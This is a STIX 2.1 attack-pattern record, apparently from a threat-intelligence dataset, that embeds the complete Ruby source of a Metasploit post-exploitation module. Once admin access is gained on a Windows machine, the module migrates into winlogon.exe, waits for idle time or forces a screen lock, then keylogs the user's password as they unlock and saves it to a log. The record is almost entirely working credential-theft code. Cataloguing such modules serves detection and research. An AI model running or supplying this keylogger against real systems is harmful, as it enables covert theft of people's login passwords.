{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--c446d3a5-27fd-45df-889f-34b143f3d74c",
    "created": "2024-08-14T16:33:13.571847Z",
    "modified": "2024-08-14T16:33:13.57185Z",
    "name": "Windows Capture Winlogon Lockout Credential Keylogger",
    "description": " This module migrates and logs Microsoft Windows user's passwords via Winlogon.exe using idle time and natural system changes to give a false sense of security to the user.  'License' => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/post/windows/capture/lockout_keylogger.rb",
            "external_id": "lockout_keylogger.rb"
        },
        {
            "source_name": "References=>URL",
            "external_id": "http://blog.metasploit.com/2010/12/capturing-windows-logons-with.html"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Post\n  include Msf::Post::File\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'Windows Capture Winlogon Lockout Credential Keylogger',\n        'Description' => %q{\n          This module migrates and logs Microsoft Windows user's passwords via\n          Winlogon.exe using idle time and natural system changes to give a\n          false sense of security to the user.\n        },\n        'License' => MSF_LICENSE,\n        'Author' => [ 'mubix', 'cg' ],\n        'Platform' => ['win'],\n        'SessionTypes' => ['meterpreter'],\n        'References' => [['URL', 'http://blog.metasploit.com/2010/12/capturing-windows-logons-with.html']],\n        'Compat' => {\n          'Meterpreter' => {\n            'Commands' => %w[\n              core_migrate\n              stdapi_railgun_api\n              stdapi_sys_process_get_processes\n              stdapi_sys_process_getpid\n              stdapi_ui_get_idle_time\n              stdapi_ui_get_keys_utf8\n              stdapi_ui_start_keyscan\n              stdapi_ui_stop_keyscan\n            ]\n          }\n        }\n      )\n    )\n\n    register_options(\n      [\n        OptInt.new('INTERVAL', [true, 'Time between key collection during logging', 30]),\n        OptInt.new('HEARTBEAT', [true, 'Heart beat between idle checks', 30]),\n        OptInt.new('LOCKTIME', [true, 'Amount of idle time before lockout', 300]),\n        OptInt.new('PID', [false, 'Target PID, only needed if multiple winlogon.exe instances exist', nil]),\n        OptBool.new('WAIT', [true, 'Wait for lockout instead of default method', false])\n      ]\n    )\n  end\n\n  def check_admin\n    status = client.railgun.shell32.IsUserAnAdmin()\n    return status['return']\n  end\n\n  def get_winlogon\n    winlogon = []\n    session.sys.process.get_processes.each do |x|\n      if x['name'].downcase == 'winlogon.exe'\n        winlogon << x\n      end\n    end\n    if winlogon.empty?\n      print_status('Winlogon not found! Exiting')\n      return 'exit'\n    elsif winlogon.size == 1\n      return winlogon[0]['pid']\n    else\n      print_error('Multiple WINLOGON processes found, run manually and specify pid')\n      print_error('Be wise. XP / VISTA / 7 use session 0 - 2k3/2k8 use RDP session')\n      winlogon.each do |tp|\n        print_status(\"Winlogon.exe - PID: #{tp['pid']} - Session: #{tp['session']}\")\n      end\n      return 'exit'\n    end\n  end\n\n  # Function for starting the keylogger\n  def startkeylogger(session)\n    print_status('Starting the keystroke sniffer...')\n    session.ui.keyscan_start\n    return true\n  rescue StandardError\n    print_error('Failed to start Keylogging!')\n    return false\n  end\n\n  # Function for Collecting Capture (pulled from Carlos Perez's Keylogrecorder)\n  def keycap(session, keytime, logfile)\n    rec = 1\n    # Creating DB for captured keystrokes\n    print_status(\"Keystrokes being saved in to #{logfile}\")\n    # Inserting keystrokes every number of seconds specified\n    print_status('Recording ')\n    while rec == 1\n      # getting Keystrokes\n      data = session.ui.keyscan_dump\n      outp = ''\n      data.unpack('n*').each do |inp|\n        fl = (inp & 0xff00) >> 8\n        vk = (inp & 0xff)\n        kc = VirtualKeyCodes[vk]\n\n        f_shift = fl & (1 << 1)\n        f_ctrl\t= fl & (1 << 2)\n        f_alt\t= fl & (1 << 3)\n\n        if kc\n          name = (((f_shift != 0) && (kc.length > 1)) ? kc[1] : kc[0])\n          case name\n          when /^.$/\n            outp << name\n          when /shift|click/i\n          when 'Space'\n            outp << ' '\n          else\n            outp << \" <#{name}> \"\n          end\n        else\n          outp << ' <0x%.2x> ' % vk\n        end\n      end\n      select(nil, nil, nil, 2)\n      file_local_write(logfile, \"#{outp}\\n\")\n      if !outp.nil? && (outp.chomp.lstrip != '')\n        print_status(\"Password?: #{outp}\")\n      end\n      still_locked = 1\n      # Check to see if the screen saver is on, then check to see if they have logged back in yet.\n      screensaver = client.railgun.user32.SystemParametersInfoA(114, nil, 1, nil)['pvParam'].unpack('C*')[0]\n      if screensaver == 0\n        still_locked = client.railgun.user32.GetForegroundWindow()['return']\n      end\n      if still_locked == 0\n        print_status('They logged back in, the last password was probably right.')\n        raise 'win'\n      end\n      currentidle = session.ui.idle_time\n      if screensaver == 0\n        print_status(\"System has currently been idle for #{currentidle} seconds and the screensaver is OFF\")\n      else\n        print_status(\"System has currently been idle for #{currentidle} seconds and the screensaver is ON\")\n      end\n      select(nil, nil, nil, keytime.to_i)\n    end\n  rescue ::Exception => e\n    if e.message != 'win'\n      print_line\n      print_status(\"#{e.class} #{e}\")\n    end\n    print_status('Stopping keystroke sniffer...')\n    session.ui.keyscan_stop\n  end\n\n  def run\n    # Log file variables\n    host = session.session_host\n    port = session.session_port\n    filenameinfo = '_' + ::Time.now.strftime('%Y%m%d.%M%S')\t# Create Filename info to be appended to downloaded files\n    logs = ::File.join(Msf::Config.log_directory, 'scripts', 'smartlocker')\t# Create a directory for the logs\n    ::FileUtils.mkdir_p(logs)\t# Create the log directory\n    logfile = logs + ::File::Separator + host + filenameinfo + '.txt'\t# Logfile name\n\n    # Make sure we are on a Windows host\n    if client.platform != 'windows'\n      print_error('This module does not support this platform.')\n      return\n    end\n\n    # Check admin status\n    admin = check_admin\n    if admin == false\n      print_error('Must be an admin to migrate into Winlogon.exe, exiting')\n      return\n    end\n\n    mypid = session.sys.process.getpid\n    if datastore['PID'] == 0\n      targetpid = get_winlogon\n      if targetpid == 'exit'\n        return\n      end\n\n      print_status(\"Found WINLOGON at PID:#{targetpid}\")\n    else\n      targetpid = datastore['PID']\n      print_status(\"WINLOGON PID:#{targetpid} specified. I'm trusting you...\")\n    end\n\n    if mypid == targetpid\n      print_status('Already in WINLOGON no need to migrate')\n    else\n      print_status(\"Migrating from PID:#{mypid}\")\n      begin\n        session.core.migrate(targetpid)\n      rescue StandardError\n        print_error('Unable to migrate, try getsystem first')\n        return\n      end\n      print_good(\"Migrated to WINLOGON PID: #{targetpid} successfully\")\n    end\n\n    # Override SystemParametersInfo Railgun call to check for Screensaver\n    # Unfortunately 'pvParam' changes it's type for each uiAction so\n    # it cannot be changed in the regular railgun defs\n    client.railgun.add_function('user32', 'SystemParametersInfoA', 'BOOL', [\n      ['DWORD', 'uiAction', 'in'],\n      ['DWORD', 'uiParam', 'in'],\n      ['PBLOB', 'pvParam', 'out'],\n      ['DWORD', 'fWinIni', 'in']\n    ])\n\n    print_good(\"Keylogging for #{client.info}\")\n    file_local_write(logfile, \"#{client.info}\\n\")\n    if datastore['WAIT']\n      print_status('Waiting for user to lock out their session')\n      locked = false\n      while locked == false\n        if client.railgun.user32.GetForegroundWindow()['return'] != 0\n          locked = true\n          print_status('Session has been locked out')\n        else\n          # sleep(keytime.to_i) / hardsleep applied due to missing loging right after lockout.. no good way to solve this\n          select(nil, nil, nil, 2)\n        end\n      end\n    else\n      currentidle = session.ui.idle_time\n      print_status(\"System has currently been idle for #{currentidle} seconds\")\n      while currentidle <= datastore['LOCKTIME']\n        print_status(\"Current Idle time: #{currentidle} seconds\")\n        select(nil, nil, nil, datastore['HEARTBEAT'])\n        currentidle = session.ui.idle_time\n      end\n      client.railgun.user32.LockWorkStation()\n      if client.railgun.user32.GetForegroundWindow()['return'] == 0\n        print_error('Locking the workstation falied, trying again..')\n        client.railgun.user32.LockWorkStation()\n        if client.railgun.user32.GetForegroundWindow()['return'] == 0\n          print_error('The system will not lock this session, nor will it be used for user login, exiting...')\n          return\n        else\n          print_status('Locked this time, time to start keyloggin...')\n        end\n      end\n    end\n\n    if startkeylogger(session)\n      keycap(session, datastore['INTERVAL'], logfile)\n    end\n  end\nend\n",
    "x_mitre_platforms": [
        "['win']"
    ]
}